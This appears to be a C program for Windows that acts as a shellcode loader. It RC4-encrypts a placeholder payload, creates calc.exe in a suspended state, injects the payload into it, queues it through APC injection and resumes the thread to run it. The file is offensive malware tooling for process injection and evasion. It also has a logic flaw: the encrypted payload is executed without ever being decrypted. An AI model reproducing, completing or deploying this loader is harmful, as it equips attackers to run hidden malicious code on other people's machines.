#include <windows.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"

int main() {
    DWORD processId;
    HANDLE hProcess, hThread;

    // Step 1: Define the payload and RC4 encryption key
    printf("[*] Defining payload and encryption key...\n");
    unsigned char payload[] = { 0x90, 0x90, 0x90, /* add shellcode here */ };  // Example payload
    unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

    // Step 2: Encrypt the payload using RC4
    printf("[*] Encrypting payload with RC4...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
    printf("[+] Payload encrypted successfully.\n");

    // Step 3: Create a suspended process
    printf("[*] Creating a suspended process (calc.exe)...\n");
    if (!CreateSuspendedProcess("calc.exe", &processId, &hProcess, &hThread)) {
        printf("[!] Failed to create process.\n");
        return -1;
    }
    printf("[+] Process created successfully with PID: %d.\n", processId);

    // Step 4: Inject the encrypted payload into the suspended process
    printf("[*] Injecting encrypted payload into the process...\n");
    LPVOID lpBaseAddress = InjectPayload(hProcess, payload, sizeof(payload));
    if (lpBaseAddress == NULL) {
        printf("[!] Failed to inject payload.\n");
        return -1;
    }
    printf("[+] Payload injected at base address: 0x%p.\n", lpBaseAddress);

    // Step 5: Queue the payload for execution using APC injection
    printf("[*] Queuing the payload using APC injection...\n");
    if (!QueuePayloadAPC(hThread, lpBaseAddress)) {
        printf("[!] Failed to queue payload.\n");
        return -1;
    }
    printf("[+] Payload successfully queued for APC injection.\n");

    // Step 6: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    ResumeThread(hThread);
    printf("[+] Thread resumed, payload should now execute.\n");

    return 0;
}
